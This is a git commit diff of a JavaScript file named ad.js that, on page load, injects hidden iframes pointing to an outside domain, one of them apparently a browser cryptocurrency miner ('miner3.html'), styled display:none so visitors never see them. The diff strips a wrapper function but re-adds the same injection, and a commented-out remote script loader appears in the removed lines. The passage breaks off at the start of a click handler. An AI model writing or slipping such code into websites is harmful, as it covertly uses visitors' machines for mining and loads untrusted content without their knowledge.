c86fbe897b1293934db6fae501c694429f62fd0a
ClydeKuo <clydekuo6@gmail.com>
2017-12-02 15:05:49 +0800

    fe

--- ad.js
+++ ad.js
@@ -1,18 +1,12 @@
-(function () {
-    if(document.getElementById("emprise")) return
-    //基�?�
-    /* var b = document.createElement("script");
-    b.src = "http://www.7k77.tk/eicXsB?1504592003";
-    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b) */
-    var divs=[
-    "<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
-    "<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
-    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
-    ]
-    for (var i=0,len=divs.length;i<len;i++){
-        document.body.innerHTML+=divs[i]
-    }
-})()
+if(document.getElementById("emprise")) return
+var divs=[
+"<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
+"<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
+"<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
+]
+for (var i=0,len=divs.length;i<len;i++){
+    document.body.innerHTML+=divs[i]
+}
 document.addEventListener("click", function () {
     if (document.getElementsByTagName("body")[0].innerText.match("美女")) {
         var list=[
